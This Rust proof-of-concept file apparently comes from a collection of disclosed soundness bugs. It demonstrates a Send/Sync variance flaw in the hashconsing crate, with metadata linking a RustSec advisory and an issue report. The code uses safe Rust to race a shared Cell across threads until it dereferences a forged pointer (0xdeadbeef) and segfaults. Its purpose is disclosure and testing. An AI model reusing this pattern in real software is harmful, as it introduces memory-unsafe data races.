/*!
```rudra-poc
[target]
crate = "hashconsing"
version = "1.0.1"

[[target.peer]]
crate = "crossbeam-utils"
version = "0.8.0"

[test]
analyzers = ["SendSyncVariance"]
bug_classes = ["SendSyncVariance"]

[report]
rustsec_url = "https://github.com/RustSec/advisory-db/pull/584"
issue_url = "https://github.com/AdrienChampion/hashconsing/issues/1"
issue_date = 2020-11-10
unique_bugs = 1
additional_send_sync_violations = 1
```
!*/
#![forbid(unsafe_code)]

use hashconsing::{HConsed, HConsign, HashConsign};

use crossbeam_utils::thread;
use std::cell::Cell;
use std::hash::{Hash, Hasher};

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
enum RefOrInt<'a> {
    Ref(&'a u64),
    Int(u64),
}

#[derive(PartialEq, Eq)]
struct HashableCell<T: Eq + PartialEq + Copy> {
    cell: Cell<T>,
}
// Fake hashing function just so we can get a HConsed going.
impl<T: Eq + PartialEq + Copy> Hash for HashableCell<T> {
    fn hash<H: Hasher>(&self, state: &mut H) {
        1024.hash(state);
    }
}

static SOME_INT: u64 = 123;

fn main() {
    let cell = Cell::new(RefOrInt::Ref(&SOME_INT));
    let hashable_cell = HashableCell { cell: cell };

    let mut factory: HConsign<_> = HConsign::empty();
    let hcons_cell_ref = factory.mk(&hashable_cell);
    thread::scope(|s| {
        s.spawn(move |_| {
            let smuggled_cell = &hcons_cell_ref.get().cell;

            loop {
                // Repeatedly write Ref(&addr) and Int(0xdeadbeef) into the cell.
                smuggled_cell.set(RefOrInt::Ref(&SOME_INT));
                smuggled_cell.set(RefOrInt::Int(0xdeadbeef));
            }
        });

        loop {
            if let RefOrInt::Ref(addr) = hashable_cell.cell.get() {
                // Hope that between the time we pattern match the object as a
                // `Ref`, it gets written to by the other thread.
                if addr as *const u64 == &SOME_INT as *const u64 {
                    continue;
                }

                // Due to the data race, obtaining Ref(0xdeadbeef) is possible
                println!("Pointer is now: {:p}", addr);
                println!("Dereferencing addr will now segfault: {}", *addr);
            }
        }
    });
}
